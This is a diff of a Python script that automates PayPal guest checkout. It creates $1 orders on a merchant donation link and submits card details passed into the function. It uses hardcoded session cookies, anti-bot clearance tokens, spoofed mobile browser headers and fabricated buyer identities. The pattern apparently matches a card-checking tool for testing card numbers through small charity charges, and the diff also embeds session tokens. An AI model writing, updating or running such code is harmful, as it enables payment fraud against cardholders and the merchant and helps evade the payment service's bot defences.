@@ -90,53 +90,135 @@ def process_paypal_payment(card_details_string):
             'postalCode': '10010'
         }
 
-        # Request 2: PayPal Payment Page
-        cookies.update({
-            'cookie_check': 'yes', 'd_id': '12922161e46740a7acc87901fe7324831759913487189',
-            'TLTDID': '80877570812458672724967916669905', 'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'H7TsI84-o0Zr9N4kGUDJtKazmaL7rM8R6DzyURNG1knPzAJaJ_pnZ7NRuAGFBktf3LcAIPy8Y_E7NtK0',
-            'sc_f': '9H4wGeIJdGerRjM3qB0tbYn--97zvTburDnoV5z2DL5pvS-vqTG_td9_qT7KOZ3hC3L8biDI-YjjF7koRzbKhTfUIW6b7Hdw0BjD7W', 'cookie_prefs': 'T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner',
-            'ui_experience': 'did_set%3Dtrue', 'enforce_policy': 'gdpr_v2.1',
+        # --- 2. Execute PayPal Request Sequence ---
+        # (This is the core logic from your original script)
+        
+        # Updated cookies
+        cookies = {
+            'cookie_check': 'yes',
+            'd_id': '12922161e46740a7acc87901fe7324831759913487189',
+            'TLTDID': '80877570812458672724967916669905',
+            'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'H7TsI84-o0Zr9N4kGUDJtKazmaL7rM8R6DzyURNG1knPzAJaJ_pnZ7NRuAGFBktf3LcAIPy8Y_E7NtK0',
+            'sc_f': '9H4wGeIJdGerRjM3qB0tbYn--97zvTburDnoV5z2DL5pvS-vqTG_td9_qT7KOZ3hC3L8biDI-YjjF7koRzbKhTfUIW6b7Hdw0BjD7W',
+            'cookie_prefs': 'T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner',
+            '_gcl_au': '1.1.1110398748.1761806557',
+            '_gid': 'GA1.2.78159526.1762933846',
+            'ui_experience': 'did_set%3Dtrue',
+            'enforce_policy': 'gdpr_v2.1',
+            '_ga_FQYH6BLY4K': 'GS1.1.1762970377.2.0.1762970377.0.0.0',
             'cf_clearance': 'DZpsMmtsNWdBjkt8Q016qfJ6V27sWXLV5nR7.Ytu3sk-1762971274-1.2.1.1-DL_yGY14LI0ZVaQp0dfLoZRI5nROygMXs2BpslSfiq5iiyqRJ3gyWai5aXegckhcauoH0N0T7Cg1.pPaeAMcBH0LMf95tfzws2cd_ub6BoZKoKoIhXD_YZzbGoTwdahPY9kcfmrZNxtFZYbVbWmUGCwlh11P00xCeG1rPrvUYZK08N7WlEi0ObutDXVRTg_gT4MqRwYkUejAjSr4hs16v3XnYioNIZFiAx9wOz6mY.Q',
-            'LANG': 'en_US%3BUS', 'x-csrf-jwt': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6IjdhRzMxZHhWMFhZM3dHQTZhSDI1N213allabzFFZkxZZDNVc2tKcGN2bmdXR1BFcjFVNkZiaTNCSDAtRHcwRHBWMWt3cW9DQ2oyTDI4SWJmQlhKTWFaYVUtT1NVdmhKU0w3U2ZSYzZFZ2hzU2Z6RG1zbkh4QUJPc05oQXhJOXZhRW1VNjhVVm1uR25UYzgyMUFZQk9GMEU3TVdMWlJGeEhhRFNDQ3JYQmh6bFhXd0dmVE1QdzdKVXJUbmkiLCJpYXQiOjE3NjMwMTcxMTAsImV4cCI6MTc2MzAyMDcxMH0.9sr06U4sy5w6mVM1UI67r06B0Mw532EtVct59lq2Wt8',
-            'l7_az': 'dcg15.slc', 'ts_c': 'vr%3Db9d519811990accc283435ebff39312f%26vt%3D7c0232fc19a0aa38e4bfc5d6fdd038fb',
-            'SEGM': 'bRdV1vB0ebq9RKdAb3xSHowCi6QnnlCiDOLNk8i1mAuLl1vTbzHQwWajSsMe8mvoWiJtY1GnpzN4Y-sixGy7BQ', 'TLTSID': '54911878827573588059226292747112',
-            'rssk': 'd%7DC9%40%3C656%3C2%406%3F%3E%3C%3Exqx%3Ej8~%3Bw%7Cv%7D%3F14', 'ddi': 'nSZqQVx5uYRUvw6NPWwfj_V5eoJkuhauZ3QgS1Nw9mY8GSvW5QtliIsVhvXH8fT8TJIpZWcG0RvbOk4sllwxa4p2xqDYbvOI2ZOA4n1FVyxkseCZ',
-            '_iidt': 'Ee+0AuoyDP98sD+7esqH/QouklwDHrZESG75LFPKmPTjXJHtiwhdrPUgU+tEAz3of/XDdACMLrOCC4bbkdo7YQDBu+wC0JVP0aqx0Jo=', 'login_email': 'fddfdrocky%40gmail.com',
-            'AV894Kt2TSumQQrJwe-8mzmyREO': 'S23AAPAszO5p8Qo7d3ZRe8ID4cKE2Ap1HOPBnp1Fe9S3jRMzMrcKKVJQBUoljn3V4yrF39FZ1X7mLplacHJkj-pfByv_7tL3w', 'rmuc': 'Ib4jqFYhYkRkf0-n7C79_yKDrW5jDZxik4bbfxJ8sE7XaHqV9od4Cy-6bZw1jvtJeDtsf6jvstYxXldxl31j6x7H9j0PV2zY77tJK0XVcp0aCsSF4yHvmTL4V47mpMpXgBfMrHlvWNDxV4wWWycNxPFU9OhaSNSTLf5L6m',
-            'HaC80bwXscjqZ7KM6VOxULOB534': '2aKrTRJkH7JeF2ibSIn3RzPh7TS_vnvV9p43MG7ee_lzkwvYVBEjDHCHKT0V89oGesEFe84_Zr25DtMUahHYFcrJ7Ng4ZDK317uJpZRHg8hAaLCZY0qE13gPAWGbeLljCv8ew0', 'datadome': 'XF9awpB6vz54hlQ~6CcIixFagsfNWYEnCoXEEztcLMyD4g3i43NgwmCY76PRGhkIfW3TQHcnC_hU~rwmFU3nHxAzjpSY9qR4KG6YqMEGEq3m8HpEBPyfwpB1d7Y4YCwP',
-            'nsid': 's%3AXUaNH8PnV6nS2WoMzFnhCnviw29kGtZJ.8h1zeZNdVWRDH48WIrfdBy0Vve4L9nfC1jjNvfShL%2Bw', 'tsrce': 'cspreportnodeweb',
-            'x-pp-s': 'eyJ0IjoiMTc2MzAxODY3Njk3NCIsImwiOiIwIiwibSI6IjAifQ', 'ts': 'vreXpYrS%3D1794554677%26vteXpYrS%3D1763020477%26vr%3Db9d519811990accc283435ebff39312f%26vt%3D7c0232fc19a0aa38e4bfc5d6fdd038fb%26vtyp%3Dreturn', '_dd_s': 'aid=024oe6ffz1&rum=2&id=12bcd115-cdb0-496b-8c70-710d1d6c4ed0&created=1763017212336&expire=1763019575864',
-        })
-        headers.update({'referer': 'https://dogstrustusa.org/'})
+            '_ga': 'GA1.2.675632114.1761761444',
+            'LANG': 'en_US%3BUS',
+            'x-csrf-jwt': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6IjdhRzMxZHhWMFhZM3dHQTZhSDI1N213allabzFFZkxZZDNVc2tKcGN2bmdXR1BFcjFVNkZiaTNCSDAtRHcwRHBWMWt3cW9DQ2oyTDI4SWJmQlhKTWFaYVUtT1NVdmhKU0w3U2ZSYzZFZ2hzU2Z6RG1zbkh4QUJPc05oQXhJOXZhRW1VNjhVVm1uR25UYzgyMUFZQk9GMEU3TVdMWlJGeEhhRFNDQ3JYQmh6bFhXd0dmVE1QdzdKVXJUbmkiLCJpYXQiOjE3NjMwMTcxMTAsImV4cCI6MTc2MzAyMDcxMH0.9sr06U4sy5w6mVM1UI67r06B0Mw532EtVct59lq2Wt8',
+            '_iidt': 'Ee+0AuoyDP98sD+7esqH/QouklwDHrZESG75LFPKmPTjXJHtiwhdrPUgU+tEAz3of/XDdACMLrOCC4bbkdo7YQDBu+wC0JVP0aqx0Jo=',
+            'rmuc': 'Ib4jqFYhYkRkf0-n7C79_yKDrW5jDZxik4bbfxJ8sE7XaHqV9od4Cy-6bZw1jvtJeDtsf6jvstYxXldxl31j6x7H9j0PV2zY77tJK0XVcp0aCsSF4yHvmTL4V47mpMpXgBfMrHlvWNDxV4wWWycNxPFU9OhaSNSTLf5L6m',
+            'SEGM': 'bRdV1vB0ebq9RKdAb3xSHowCi6QnnlCiDOLNk8i1mAuLl1vTbzHQwWajSsMe8mvoWiJtY1GnpzN4Y-sixGy7BQ',
+            'nsid': 's%3AuvQa5zl3FDLmN7HqnHQ9ZO6zOQ_Ms8Qy.H8jz9urmBmjBplsP7xGMxSlmRHUnTkeiBk%2Bx4A3MxEE',
+            'TLTSID': '71778317580319994566665135233870',
+            'datadome': 'wmHhFJFCQTQ0G3c0Q1xN2LrtL63tAsMRGRka4zXOGIYDVF1X0DquUOzV3DpZm4TQB9JxtIf_Pbgd99A6_4TkDd1xVOa~G9Z9Rn3~pIK5wCSgn_Zn9ejioOH7Z4nQT3jP',
+            '_cfuvid': 'W86WzOT4xdTdbdGGvSgq6wWVqL.m9Pp4TMhW7.TRZiw-1763033243208-0.0.1.1-604800000',
+            'ts_c': 'vr%3Db9d519811990accc283435ebff39312f%26vt%3D7d51014319a0a5542019d918fd93bb99',
+            'login_email': 'rocky%40gmail.com',
+            'ddi': 'QVEEgPZ9nqVNiMRRbGKhbP6QaLoJdMP_Gs0fcyCMLuiyj_M92doqyOHg-MK2m-NgEycsHRw-5QhBIBWFQK-H8RpPaZVQrUW4i7IYlgCu2ut-ERyF',
+            'l7_az': 'dcg15.slc',
+            'tsrce': 'cspreportnodeweb',
+            '_gat_gtag_UA_53389718_12': '1',
+            'x-pp-s': 'eyJ0IjoiMTc2MzA0Mjc1NjcwOSIsImwiOiIwIiwibSI6IjAifQ',
+            'ts': 'vreXpYrS%3D1794578757%26vteXpYrS%3D1763044557%26vr%3Db9d519811990accc283435ebff39312f%26vt%3D7d51014319a0a5542019d918fd93bb99%26vtyp%3Dreturn',
+            '_dd_s': 'aid=20rugcqkur&rum=2&id=7a772a70-1c06-486b-82f9-06df5c94c4d4&created=1763042754290&expire=1763043655298',
+        }
+
+        # Request 2: PayPal Payment Page (Updated headers)
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'no-cache',
+            'pragma': 'no-cache',
+            'priority': 'u=0, i',
+            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
+            'sec-ch-ua-arch': '""',
+            'sec-ch-ua-bitness': '"64"',
+            'sec-ch-ua-full-version': '"142.0.7444.135"',
+            'sec-ch-ua-full-version-list': '"Chromium";v="142.0.7444.135", "Google Chrome";v="142.0.7444.135", "Not_A Brand";v="99.0.0.0"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"Nexus 5"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"6.0"',
+            'sec-ch-ua-wow64': '?0',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
+        }
         requests.get('https://www.paypal.com/ncp/payment/R2FGT68WSSRLW', cookies=cookies, headers=headers, timeout=10)
 
         # Request 3: Create Order
         headers.update({
-            'content-type': 'application/json', 'origin': 'https://www.paypal.com',
-            'x-csrf-token': 'v5ArOERBgP2jPK0jWmvbtSGBln33/23T7B8OI=', 'traceparent': '00-000000000000000035c33ef71b24de23-1ac6b914c8dc9420-01'
+            'content-type': 'application/json', 
+            'origin': 'https://www.paypal.com',
+            'x-csrf-token': 'v5ArOERBgP2jPK0jWmvbtSGBln33/23T7B8OI=', 
+            'traceparent': '00-000000000000000035c33ef71b24de23-1ac6b914c8dc9420-01'
         })
         json_data = {
-            'link_id': 'R2FGT68WSSRLW', 'merchant_id': '32BACX6X7PYMG', 'quantity': '1',
-            'amount': '1', 'currency': 'USD', 'funding_source': 'CARD', 'button_type': 'VARIABLE_PRICE', 'csrfRetryEnabled': True,
+            'link_id': 'R2FGT68WSSRLW', 
+            'merchant_id': '32BACX6X7PYMG', 
+            'quantity': '1',
+            'amount': '1', 
+            'currency': 'USD', 
+            'funding_source': 'CARD', 
+            'button_type': 'VARIABLE_PRICE', 
+            'csrfRetryEnabled': True,
         }
         requests.post('https://www.paypal.com/ncp/api/create-order', cookies=cookies, headers=headers, json=json_data, timeout=10)
 
-        # Request 4: Submit Card Details
-        headers.update({
-            'paypal-client-context': '0J285934SF9809316', 'paypal-client-metadata-id': '0J285934SF9809316',
-            'referer': 'https://www.paypal.com/smart/card-fields?token=7BH45372E7327524M&sessionID=uid_4e175b5f2e_mdc6mje6mdm&buttonSessionID=uid_066c21951b_mdc6mju6mja&locale.x=en_US&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVhJOXVmRTBTMmNiRlhFaTcxa0hSdTlNYVFiTjAxVVlQdVFpZEp4akVfdDAwWWs2TmRTcjBqb1hodDRaM05Odnc2cGpaU0NxRy1wOTlGWlMmbWVyY2hhbnQtaWQ9MzJCQUNYNlg3UFlNRyZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZjdXJyZW5jeT1VU0QmbG9jYWxlPWVuX1VTJmVuYWJsZS1mdW5kaW5nPXZlbm1vLHBheWxhdGVyIiwiYXR0cnMiOnsiZGF0YS1jc3Atbm9uY2UiOiJEMVhrS2kzOGZvK2tURkNOdWR6OElvYlhWZ3RLOElkVjZablVZVGtnWGdCYkVvT3IiLCJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXVpZCI6InVpZF9nbXVkdHBsc2dtb2JycHp4YmNrcWlsdnZmYm50amsifX0&disable-card=',
-            'x-app-name': 'standardcardfields', 'x-country': 'US'
-        })
+        # Request 4: Submit Card Details (Updated headers and token)
+        headers = {
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'no-cache',
+            'content-type': 'application/json',
+            'origin': 'https://www.paypal.com',
+            'paypal-client-context': '7BH45372E7327524M',
+            'paypal-client-metadata-id': '7BH45372E7327524M',
+            'pragma': 'no-cache',
+            'priority': 'u=1, i',
+            'referer': 'https://www.paypal.com/smart/card-fields?token=7BH45372E7327524M&sessionID=uid_3343f8e4cd_mtq6mdu6ntu&buttonSessionID=uid_3ecbcad4f0_mtq6mdy6mzq&locale.x=en_US&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVhJOXVmRTBTMmNiRlhFaTcxa0hSdTlNYVFiTjAxVVlQdVFpZEp4akVfdDAwWWs2TmRTcjBqb1hodDRaM05Odnc2cGpaU0NxRy1wOTlGWlMmbWVyY2hhbnQtaWQ9MzJCQUNYNlg3UFlNRyZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZjdXJyZW5jeT1VU0QmbG9jYWxlPWVuX1VTJmVuYWJsZS1mdW5kaW5nPXZlbm1vLHBheWxhdGVyIiwiYXR0cnMiOnsiZGF0YS1jc3Atbm9uY2UiOiJkeHBBaHhPd3NXMDZJaWlFR3p1c3RxVFY3Q2FtckRJWEdvdHA1SUt6Q1pzNkhCUkQiLCJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXVpZCI6InVpZF9nbXVkdHBsc2dtb2JycHp4YmNrcWlsdnZmYm50amsifX0&disable-card=',
+            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
+            'sec-ch-ua-arch': '""',
+            'sec-ch-ua-bitness': '"64"',
+            'sec-ch-ua-full-version': '"142.0.7444.135"',
+            'sec-ch-ua-full-version-list': '"Chromium";v="142.0.7444.135", "Google Chrome";v="142.0.7444.135", "Not_A Brand";v="99.0.0.0"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"Nexus 5"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"6.0"',
+            'sec-ch-ua-wow64': '?0',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
+            'x-app-name': 'standardcardfields',
+            'x-country': 'US',
+        }
+        
         json_data = {
             'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
             'variables': {
-                'token': '7BH45372E7327524M', 'card': card_details, 'phoneNumber': '2399925589',
-                'firstName': 'Rocky', 'lastName': 'og',
-                'billingAddress': {'givenName': 'Rocky', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'NY', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
-                'shippingAddress': {'givenName': 'Rocky', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'NY', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
-                'email': 'rockyog@gmail.com', 'currencyConversionType': 'VENDOR',
-            }, 'operationName': None,
+                'token': '7BH45372E7327524M',  # Updated token
+                'card': card_details, 
+                'phoneNumber': '4073320637',
+                'firstName': 'Rockcy', 
+                'lastName': 'og',
+                'billingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
+                'shippingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
+                'email': 'rocky2@gmail.com', 
+                'currencyConversionType': 'PAYPAL',
+            }, 
+            'operationName': None,
         }
+        
         response = requests.post('https://www.paypal.com/graphql?fetch_credit_form_submit', cookies=cookies, headers=headers, json=json_data, timeout=20)
         response_data = response.json()
 
